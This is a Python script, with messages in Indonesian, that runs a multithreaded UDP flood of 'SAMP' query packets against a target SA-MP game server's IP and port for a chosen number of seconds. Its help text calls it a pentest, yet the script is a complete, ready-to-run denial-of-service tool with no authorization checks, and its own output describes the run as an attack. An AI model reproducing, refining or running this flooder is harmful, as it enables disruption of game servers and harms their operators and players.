import socket
import random
import threading
import time
import argparse

def samp_query_flood(ip, port, duration, threads, delay):
    def flood():
        end_time = time.time() + duration
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

        query_packet = b'SAMP' + bytes([int(i) for i in ip.split('.')]) + bytes([port & 0xFF, (port >> 8) & 0xFF]) + b'i'

        while time.time() < end_time:
            try:
                sock.sendto(query_packet, (ip, port))
                if delay > 0:
                    time.sleep(delay)
            except:
                pass

    print(f"[!] Menyerang protokol query SAMP {ip}:{port} selama {duration} detik...")

    thread_list = []
    for _ in range(threads):
        t = threading.Thread(target=flood)
        t.start()
        thread_list.append(t)

    for t in thread_list:
        t.join()

    print("[✓] Selesai flood.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="SAMP Query Flood Pentest")
    parser.add_argument("ip", help="IP target")
    parser.add_argument("port", type=int, help="Port UDP target (biasanya 7777)")
    parser.add_argument("duration", type=int, help="Durasi flood (detik)")
    parser.add_argument("--threads", type=int, default=50, help="Jumlah thread")
    parser.add_argument("--delay", type=float, default=0.001, help="Delay antar paket (detik)")

    args = parser.parse_args()

    samp_query_flood(args.ip, args.port, args.duration, args.threads, args.delay)
